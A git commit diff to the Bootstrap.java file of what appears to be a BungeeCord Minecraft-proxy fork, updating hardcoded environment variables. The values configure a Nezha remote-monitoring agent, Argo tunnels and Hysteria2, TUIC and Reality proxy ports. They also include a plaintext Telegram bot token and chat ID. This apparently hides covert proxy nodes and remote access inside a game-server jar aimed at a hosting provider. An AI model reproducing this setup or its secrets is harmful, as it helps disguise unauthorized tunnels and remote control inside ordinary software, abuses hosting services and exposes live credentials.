edd169f72767e148ab00e43dcdcca04709c92fe0
pingmike2 <166621491+pingmike2@users.noreply.github.com>
2025-10-24 23:15:17 +0800

    Update environment variables in Bootstrap.java

--- bootstrap/src/main/java/net/md_5/bungee/Bootstrap.java
+++ bootstrap/src/main/java/net/md_5/bungee/Bootstrap.java
@@ -98,19 +98,19 @@ public class Bootstrap
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nezha.jaxmike.nyc.mn");
         envVars.put("NEZHA_PORT", "443");
-        envVars.put("NEZHA_KEY", "3O6Cn1wjyz5gYxOqCS");
+        envVars.put("NEZHA_KEY", "6rfgt8VuJcQCTDxu88");
         envVars.put("ARGO_PORT", "8001");
         envVars.put("ARGO_DOMAIN", "");
         envVars.put("ARGO_AUTH", "");
-        envVars.put("HY2_PORT", "26877");
-        envVars.put("TUIC_PORT", "25811");
-        envVars.put("REALITY_PORT", "26778");
+        envVars.put("HY2_PORT", "21777");
+        envVars.put("TUIC_PORT", "21778");
+        envVars.put("REALITY_PORT", "21778");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "7592034407");
         envVars.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
         envVars.put("CFIP", "104.17.97.5");
         envVars.put("CFPORT", "2096");
-        envVars.put("NAME", "eternalzero");
+        envVars.put("NAME", "lemehost");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
